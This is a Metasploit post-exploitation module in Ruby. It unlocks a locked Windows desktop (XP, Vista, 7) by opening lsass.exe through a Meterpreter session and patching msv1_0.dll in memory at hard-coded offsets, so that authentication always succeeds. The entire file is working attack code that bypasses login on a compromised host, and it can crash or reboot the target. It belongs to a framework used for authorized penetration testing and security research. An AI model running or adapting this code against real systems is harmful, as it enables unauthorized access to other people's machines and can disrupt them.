##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Escalate Locked Desktop Unlocker',
        'Description' => %q{
          This module unlocks a locked Windows desktop by patching
          the respective code inside the LSASS.exe process. This
          patching process can result in the target system hanging or
          even rebooting, so be careful when using this module on
          production systems.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'L4teral <l4teral[4t]gmail com>', # Meterpreter script
          'Metlstorm'                        # Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_config_sysinfo
              stdapi_sys_process_attach
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_write
            ]
          }
        }
      )
    )

    register_options([
      OptBool.new('REVERT', [false, "Enable this option to revert the in-memory patch and enable locking again", false])
    ])
  end

  def unsupported
    print_error("This platform is not supported with this Script!")
    raise Rex::Script::Completed
  end

  def run
    revert = datastore['REVERT']

    targets = [
      { :sig => "8bff558bec83ec50a1", :sigoffset => 0x9927, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x99cc, :os => /Windows XP.*Service Pack 2/ },
      { :sig => "8bff558bec83ec50a1", :sigoffset => 0x981b, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x98c0, :os => /Windows XP.*Service Pack 3/ },
      { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb76a, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb827, :os => /Windows Vista/ },
      { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb391, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb44e, :os => /Windows Vista/ },
      { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xacf6, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xadb3, :os => /Windows Vista/ },
      { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xe881, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xe93e, :os => /Windows 7/ },
      { :sig => "8bff558bec83ec50a1", :sigoffset => 0x97d3, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x9878, :os => /Windows XP.*Service Pack 3 - spanish/ }
    ]

    unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)
    os = client.sys.config.sysinfo['OS']

    targets.each do |t|
      if os =~ t[:os]
        target = t
        print_status("OS '#{os}' found in known targets")
        pid = client.sys.process["lsass.exe"]
        p = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
        dllbase = p.image["msv1_0.dll"]

        sig = p.memory.read(dllbase + target[:sigoffset], target[:sig].length / 2).unpack("H*")[0]
        if sig != target[:sig]
          print_error("Found signature does not match")
          next
        end
        old_code = p.memory.read(dllbase + target[:patchoffset], target[:orig_code].length / 2).unpack("H*")[0]
        if !((old_code == target[:orig_code] && !revert) || (old_code == target[:patch] && revert))
          print_error("Found code does not match")
          next
        end

        print_status("Patching...")
        new_code = revert ? target[:orig_code] : target[:patch]
        p.memory.write(dllbase + target[:patchoffset], [new_code].pack("H*"))

        written_code = p.memory.read(dllbase + target[:patchoffset], target[:patch].length / 2).unpack("H*")[0]
        if ((written_code == target[:patch] && !revert) || (written_code == target[:orig_code] && revert))
          print_status("Done!")
          raise Rex::Script::Completed
        else
          print_error("Failed!")
          next
        end
      end
    end

    print_error("No working target found")
  end
end
